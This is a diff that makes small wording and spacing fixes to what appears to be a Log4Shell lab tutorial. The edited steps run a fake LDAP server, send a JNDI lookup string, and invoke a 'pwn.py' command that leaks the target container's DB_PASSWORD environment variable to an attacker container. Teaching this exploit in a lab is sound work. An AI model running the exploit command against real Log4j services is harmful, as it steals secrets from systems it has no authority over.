@@ -426,17 +426,17 @@ public class App {
 						<ol>
 							<li>
 								<p>
-										Runs a fake LDAP server in the background on port 8888
+										Runs a fake LDAP server in the background on port 8888.
 									</p>
 							</li>
 							<li>
 								<p>
-										Sends a request with the JNDI URI referencing the fake LDAP server asking for a Java value to leak
+										Sends a request with the JNDI URI referencing the fake LDAP server asking for a Java value to leak.
 									</p>
 							</li>
 							<li>
 								<p>
-										Parses and prints the response
+										Parses and prints the response.
 									</p>
 							</li>
 						</ol>
@@ -538,10 +538,12 @@ root@3971c61303c8:/(1)</pre>
 
 					<p>
 					In the attack shell, use the 
-						<c>ip</c> command to determine the IPv4 address of your container. We will need this since the 
+						<c>ip</c> command to determine the IPv4 address of your container by typing <c>ip addr show dev eth0</c>. We will need this since the 
 						<c>attacker</c> container will be listening for connections from 
-						<c>target</c> once the exploit string is logged.
-				
+						<c>target</c> once the exploit string is logged.</p>
+							
+						<p>
+				You should see output similar to the following:
 					</p>
 
 					<pre>root@3971c61303c8:/# ip addr show dev eth0
@@ -562,7 +564,7 @@ root@3971c61303c8:/(1)</pre>
 						<c>attacker</c> container and you should be able to read the 
 						<c>DB_PASSWORD</c> environment variable on the 
 						<c>target</c> container. by typing:
-					<c>python /pwn.py --listen-host &lt;IP_ADDRESS&gt; --exploit-host &lt;IP_ADDRESS&gt;--target http://target:8080 --leak '${env:DB_PASSWORD}' </c>
+					<c>python /pwn.py --listen-host &lt;IP_ADDRESS&gt; --exploit-host &lt;IP_ADDRESS&gt; --target http://target:8080 --leak '${env:DB_PASSWORD}' </c>
 				
 					</p><p>
 						You should see something like the following:
